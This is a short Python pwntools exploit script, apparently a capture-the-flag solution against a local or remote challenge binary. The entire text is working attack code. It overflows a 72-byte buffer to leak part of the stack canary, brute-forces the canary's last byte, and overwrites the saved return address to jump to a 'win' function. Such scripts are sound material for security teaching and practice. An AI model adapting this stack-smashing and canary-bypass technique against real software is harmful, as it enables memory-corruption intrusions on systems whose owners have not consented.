from pwn import *

context.log_level = 'debug'

win_addr = 0x4011f6

# p = remote('cyberchallenge.disi.unitn.it', 50300)
p = process('./bin')
p.sendlineafter(b'Exit\n', b'1')

payload = b'A' * 72
p.sendlineafter(b'echoed: ', payload)

p.recvline()
p.recvline()

partial_canary = b'\x00' + p.recv(6)
print(len(partial_canary), partial_canary.hex())

for byte in range(256):
    canary = partial_canary + bytes([byte])
    canary = int.from_bytes(canary, 'little')
    print(hex(canary))

    payload = b'A' * 72 + p64(canary) + b'A' * 8 + p64(win_addr)

    p.sendlineafter(b'Exit\n', b'2')
    p.sendlineafter(b': ', payload)
    p.recvline(); p.recvline()
    res = p.recvline().decode()

    if 'You are not' in res:
        print(f'canary: {hex(canary)}')
        p.sendlineafter(b'Exit\n', payload)
        p.sendlineafter(b'Exit\n', b'3')
        print(p.recvline().decode())
        break
